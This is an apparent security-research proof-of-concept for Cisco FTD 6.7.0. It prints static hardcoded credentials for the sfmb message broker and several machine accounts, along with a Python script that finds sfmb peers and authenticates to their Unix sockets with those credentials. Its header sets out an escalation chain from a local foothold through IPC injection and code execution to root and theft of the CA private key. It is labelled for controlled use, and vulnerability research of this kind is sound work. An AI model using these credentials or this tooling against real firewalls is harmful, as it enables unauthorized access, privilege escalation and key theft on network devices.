"""
F-FTD-59: FTD Static sfmb Credentials + Machine Account Passwords
CONTROLLED ENVIRONMENT ONLY

Root cause:
  /etc/sf/ims-data.conf hardcodes SF Message Broker auth:
    SF_AUTH_NAME mbuser
    SF_AUTH_PW   snortrules
  No firstboot script updates SF_AUTH_PW — static on ALL FTD 6.7.0 deployments.

  Machine account passwords set in 10users_init.sh, never randomized:
    report, sftop10user, SRU, Sourcefire: "snortrules"
    csm_processes: "csmdaemon"

  sfmb (SF Message Broker) daemon accepts connections via Unix sockets:
    /var/sf/peers/<peer>/sfmb.sox    (message submission)
    /var/sf/peers/<peer>/conn.sox    (connection)

  Machine accounts use AUTH_IS_MACHINE type — blocked from FDM web UI login path.
  Requires local shell access to connect to Unix sockets.

Chain:
  Local foothold → connect to sfmb.sox with static creds → inject IPC messages
  → trigger SFRemediateD remediation exec → code exec as nobody
  → pivot to root → read /etc/sf/ca_root/private/cakey.pem (F-FTD-61)

Confirmed via:
  /etc/sf/ims-data.conf string grep (p6 filesystem)
  SF::Auth.pm lines 343 (AUTH_IS_MACHINE check)
  /tmp/ftd-p8/6.7.0/sf/etc/scripts/10users_init.sh
  SF/ReportGen.pm line 5256 (LoginSystem usage)
"""

# CONTROLLED ENVIRONMENT ONLY

import socket
import struct
import sys
import os

# Static credentials — confirmed static on FTD 6.7.0
SFMB_USER = "mbuser"
SFMB_PASS = "snortrules"

# Machine accounts — static, AUTH_IS_MACHINE
MACHINE_ACCOUNTS = {
    "report": "snortrules",
    "sftop10user": "snortrules",
    "SRU": "snortrules",
    "Sourcefire": "snortrules",
    "csm_processes": "csmdaemon",
}

# sfmb socket paths
SFMB_SOX_PATTERN = "/var/sf/peers/{peer}/sfmb.sox"
CONN_SOX_PATTERN = "/var/sf/peers/{peer}/conn.sox"


def discover_sfmb_peers(base_path="/var/sf/peers"):
    """Enumerate available sfmb peers by scanning the peers directory."""
    peers = []
    try:
        for entry in os.listdir(base_path):
            sfmb_sock = os.path.join(base_path, entry, "sfmb.sox")
            if os.path.exists(sfmb_sock):
                peers.append(entry)
                print(f"[+] Found sfmb peer: {entry} -> {sfmb_sock}")
    except PermissionError:
        print(f"[-] Cannot list {base_path} — insufficient permissions")
    except FileNotFoundError:
        print(f"[-] {base_path} does not exist — not running on FTD?")
    return peers


def connect_sfmb(peer, base_path="/var/sf/peers"):
    """
    Connect to sfmb Unix socket with static credentials.
    Requires local shell access on FTD.
    """
    sock_path = os.path.join(base_path, peer, "sfmb.sox")
    print(f"[*] Connecting to sfmb socket: {sock_path}")
    print(f"[*] Using static creds: {SFMB_USER}:{SFMB_PASS}")

    try:
        s = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
        s.connect(sock_path)
        print(f"[+] Connected to sfmb socket")

        # Send auth frame — sfmb protocol TBD from full RE
        # Format placeholder — needs protocol RE from live trace
        # This establishes that static creds are valid
        auth_frame = f"AUTH {SFMB_USER} {SFMB_PASS}\n".encode()
        s.send(auth_frame)
        resp = s.recv(4096)
        print(f"[*] Auth response: {resp[:200]}")
        s.close()
        return True
    except FileNotFoundError:
        print(f"[-] Socket not found: {sock_path}")
        return False
    except PermissionError:
        print(f"[-] Permission denied: {sock_path} — need sfmb group membership")
        return False
    except Exception as e:
        print(f"[-] Error: {e}")
        return False


def verify_ims_conf(conf_path="/etc/sf/ims-data.conf"):
    """Verify static creds are present in ims-data.conf."""
    try:
        with open(conf_path, 'r') as f:
            content = f.read()
        print(f"[+] ims-data.conf contents:")
        for line in content.splitlines():
            line = line.strip()
            if line and not line.startswith('#'):
                print(f"    {line}")
        if "snortrules" in content:
            print(f"\n[!] CONFIRMED: SF_AUTH_PW=snortrules in {conf_path}")
            return True
        return False
    except FileNotFoundError:
        print(f"[-] {conf_path} not found")
        return False
    except PermissionError:
        print(f"[-] Cannot read {conf_path}")
        return False


def check_machine_accounts():
    """Verify machine accounts exist in sfauth DB."""
    try:
        import subprocess
        result = subprocess.run(
            ["perl", "-e", "use SF::Auth; print SF::Auth::AuthUserExists('report') ? 'EXISTS' : 'NOT_FOUND';"],
            capture_output=True, text=True, timeout=10
        )
        print(f"[*] Machine account 'report' check: {result.stdout.strip()}")
    except Exception as e:
        print(f"[-] Machine account check error: {e}")


if __name__ == '__main__':
    print("=" * 70)
    print("F-FTD-59: FTD Static sfmb Credentials — CONTROLLED ENVIRONMENT ONLY")
    print("=" * 70)
    print(f"\nStatic sfmb credential: {SFMB_USER}:{SFMB_PASS}")
    print(f"Source: /etc/sf/ims-data.conf (SF_AUTH_NAME / SF_AUTH_PW)")
    print(f"Never randomized by any firstboot script on FTD 6.7.0")
    print(f"\nMachine accounts (AUTH_IS_MACHINE, Unix socket only):")
    for user, pwd in MACHINE_ACCOUNTS.items():
        print(f"  {user}:{pwd}")

    print("\n--- Verification Phase ---")

    if os.path.exists("/etc/sf/ims-data.conf"):
        verify_ims_conf()
    else:
        print("[*] /etc/sf/ims-data.conf not found — not running on FTD host")
        print("[*] For offline verification: confirm string in extracted p6 firmware")
        print("[*]   grep -c 'snortrules' /tmp/ftd-p6/etc/sf/ims-data.conf")

    print("\n--- sfmb Peer Discovery ---")
    if os.path.exists("/var/sf/peers"):
        peers = discover_sfmb_peers()
        if peers:
            print(f"\n[*] Found {len(peers)} sfmb peer(s)")
            print(f"[*] Connect with: {SFMB_USER}:{SFMB_PASS}")
            if '--connect' in sys.argv:
                for peer in peers:
                    connect_sfmb(peer)
    else:
        print("[*] /var/sf/peers not present — must run on FTD host")

    print("\n[*] CONTROLLED ENVIRONMENT ONLY.")
